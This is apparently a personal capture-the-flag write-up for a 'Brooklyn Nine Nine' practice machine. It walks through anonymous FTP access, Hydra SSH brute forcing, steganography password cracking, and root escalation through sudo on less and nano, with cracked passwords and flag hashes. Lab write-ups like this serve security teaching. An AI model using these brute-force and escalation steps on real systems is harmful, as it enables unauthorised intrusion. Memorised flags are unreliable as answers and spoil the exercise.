- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Objective

Root the Machine .
# First Method (SSH)

## Recon
### Nmap

We can use [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) to scan our target :

```
└─$ nmap -sV -Pn 10.10.32.25 

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration
### Ftp 

We can start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on [FTP](../../3%20-%20Tags/Hacking%20Concepts/FTP.md) port :

```
└─$ ftp 10.10.32.25 
Connected to 10.10.32.25.
220 (vsFTPd 3.0.3)
Name (10.10.32.25:mdn0x): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41579|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||8224|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |****************************************|   119        1.04 MiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (1.41 KiB/s)

```

and we have a file :

```
└─$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```

so we have a name Jake and we know he had a weak password, maybe he didn't change that, we can try on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md).
## SSH Bruteforce Exploit

### Hydra

We can [Bruteforcing](../../3%20-%20Tags/Hacking%20Concepts/Bruteforcing.md) with [Hydra](../../3%20-%20Tags/Hacking%20Tools/Hydra.md)

```Kali
└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.32.25 ssh

[22][ssh] host: 10.10.32.25   login: jake   password: 987654321
```

### First Access

```
└─$ ssh jake@10.10.32.25            
The authenticity of host '10.10.32.25 (10.10.32.25)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.32.25' (ED25519) to the list of known hosts.

jake@10.10.32.25's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ 

```

now we can find the first [Flag](../../3%20-%20Tags/Hacking%20Concepts/Flag.md)  :

```
└─$ cd home
jake@brookly_nine_nine:/home$ ls
amy  holt  jake
jake@brookly_nine_nine:/home$ cd holt
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee

```

## Privilege Escalation

For [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) we first check sudo commands for user jake :

```
└─$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

```

we can see we have sudo for **[Less](../../3%20-%20Tags/Hacking%20Concepts/Less.md)** .

### GTFObins

Using [GTFObins](../../3%20-%20Tags/Hacking%20Tools/GTFObins.md) we search for SUDO - less :

![af573d8a895fa379e07c75476177ef3e.png](../../2%20-%20Resources/Others/Flameshots/af573d8a895fa379e07c75476177ef3e.png)

we paste the command in our terminal and confirm with enter :

```
jake@brookly_nine_nine:~$ sudo less /etc/profile

# whoami
root
# 

```

and we search for flag :

```
# cat /root/root.txt                           
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!

```


# Second Method (HTTP)

## Recon
### Nmap

We use [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) for our scan :

```
└─$ nmap -sV -Pn 10.10.32.25 

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration
### HTTP 

<img src="../../2%20-%20Resources/Others/Flameshots/45a13adaf61306e43ed94ef5ee6a78bc.png" alt="45a13adaf61306e43ed94ef5ee6a78bc.png" width="351" height="259" class="jop-noMdConv">

```
<div class="bg"></div>

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
</body>
</html>
```

so we have a big hint we can download the image in the page and check for hidden files in it .

### Steghide

Let's use [Steghide](../../3%20-%20Tags/Hacking%20Tools/Steghide.md) :
```
└─$ steghide --extract -sf brooklyn99.jpg 
Enter passphrase: 
```

we can crack the password with [Stegcracker](../../3%20-%20Tags/Hacking%20Tools/Stegcracker.md).

### Stegcracker

```
└─$ stegcracker brooklyn99.jpg 

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20459 passwords
Your file has been written to: brooklyn99.jpg.out
admin

```

and we have it :

```
└─$ cat brooklyn99.jpg.out 
Holts Password:
fluffydog12@ninenine

Enjoy!!

```

and it uses it for us , now we can access Holt [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) .

## First Access
### SSH

```
└─$ ssh holt@10.10.32.25             
holt@10.10.32.25's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
holt@brookly_nine_nine:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

## Privilege Escalation

For [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) we check and we can run [Nano](../../3%20-%20Tags/Hacking%20Tools/Nano.md) as root :

```
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano

```

### GTFObins

We go to [GTFObins](../../3%20-%20Tags/Hacking%20Tools/GTFObins.md) and we search for SUDO - nano :

![7c5dc059942a76ca3c419adce424a8bc.png](../../2%20-%20Resources/Others/Flameshots/7c5dc059942a76ca3c419adce424a8bc.png)

![f39047c490628f88078360da397024f8.png](../../2%20-%20Resources/Others/Flameshots/f39047c490628f88078360da397024f8.png)

and get the second [Flag](../../3%20-%20Tags/Hacking%20Concepts/Flag.md) .

Pwned !!
